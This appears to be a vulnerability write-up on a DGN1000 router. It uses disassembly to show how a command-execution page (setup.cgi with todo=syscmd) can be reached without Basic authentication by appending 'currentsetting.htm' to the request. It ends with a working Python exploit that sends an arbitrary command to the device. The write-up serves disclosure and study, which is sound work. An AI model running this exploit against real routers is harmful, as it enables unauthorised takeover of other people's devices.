# DGN1000_unauthorized_comamnd_injection






---

![](vx_images/21526719452531.png)


Finally found a backdoor page here, access to find can command execution.


![](vx_images/535906218752489.png)

![](vx_images/77490624384333.png)

But now that the authorized command is executed, we need to bypass BA authentication.
![](vx_images/536381941701306.png)
After Authorization: Basic YWRtaW46cGFzc3dvcmQ= is deleted, Authorization: warning is displayed, and the command cannot be executed.

---
# Unauthorized bypass

This service starts with mini_httpd, and the Authorization function should also be included. Let's do an ida analysis

![](vx_images/471122002746760.png)
Try to locate WWW-Authenticate with an authorization-related string:

![](vx_images/596833289219970.png)

Looking at the function called from above, notice that the system log records Administrator login success-ip :%s
![](vx_images/390022922856594.png)



Next, we notice a judgment before printing the login success log.
![](vx_images/552905401506301.png)

If flag==0, the login process is executed normally and the program is suspended with kill(ppid,1). kill(ppid,17) terminates the program. This also shows from the side that it is the authorization judgment is completed, and then the end of the program, so as long as we can control the value of flag 0, it is likely to be able to log in successfully.

---

So here we go and look at the reference to flag to see if we can assign a value to it again.


![](vx_images/483973858331806.png)

We see that flag is assigned here.
But let's also focus on where does a1 come from
![](vx_images/533044257912102.png)
First a1 is passed by the calling function.

![](vx_images/290821426444562.png)
This parameter is obtained from dword_100000DC.
![](vx_images/418902345195970.png)

Of all the upper functions, this is the only one that calls it.
The logic of the program is as follows
```
currentsetting.htm存在 -----》dword_100000DC=0   -------》a1=0   ---------》不进入if(a1),直接执行后面的功能
Currentsetting. HTM there -- -- -- -- -- "dword_100000DC = 0 -- -- -- -- -- -- -- > a1 = 0 -- -- -- -- -- -- -- -- --" don't enter the if (a1), perform the functions directly
```





Let's analyze if(a1) in detail here

![](vx_images/434784871821804.png)


If flag==1, jump to lable12
![](vx_images/490116421823088.png)



# Code analysis


 Previously defined
 char v116[10000]; // [sp+2B28h] [-3330h] BYREF
 struct stat v117; // [sp+5238h] [-C20h] BYREF


![](vx_images/297617282595866.png)
Here the path is concatenated with the suffix /.htpasswd
The stat function is used to check whether the.htpasswd file exists. If it does not exist and the IP address is different from the expected one, the administrator logs in successfully

---

Explain that judgment
![](vx_images/144466560117124.png)
```
This is because each incoming packet ip_addr is stored in the location &byte_10000040. The system will print "Administrator login success-ip :%s" only when you login from another IP address.
If you do not make this judgment, each time a packet is sent from the same ip address, the log records this
```

---






if you don't enter if(stat())
The program executes lines 173 through 292
```

```

![](vx_images/326568052935500.png)

Check whether dword_100073B0 exists and no unauthorized output exists
Take the first 6 bytes, and compared to Basic, it also outputs unauthorized.
Then, obviously, it will have to compare base64 encrypted passwords

![](vx_images/216386443090192.png)
Sure enough, the following call strcmp, and after the comparison print whether the authorization is successful.



---
So here we can say,

If a1=1 and flag=0, the authentication succeeds.
When a1=1 and flag=1, the account password is verified.
When a1=0, the statement in if () is directly bypassed, and the code after LABEL_61: continues to execute

---


Since the verification of authorization is all in this if(a1), a1=0 jumps right to the back, implementing unauthorization.



---

exp

```
import requests

cmd = "ls"
target_ip="192.168.0.1"



burp0_url = "http://"+target_ip+"/setup.cgi?todo=syscmd&cmd=" + cmd + "&_=1721817685516&currentsetting.htm"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
    "Referer": "http://192.168.0.1/syscmd.htm"
}


response = requests.get(burp0_url, headers=burp0_headers)


if response.status_code == 200:

    print "Response content:"
    print response.text
else:
    print "Request failed with status code:", response.status_code

```

---




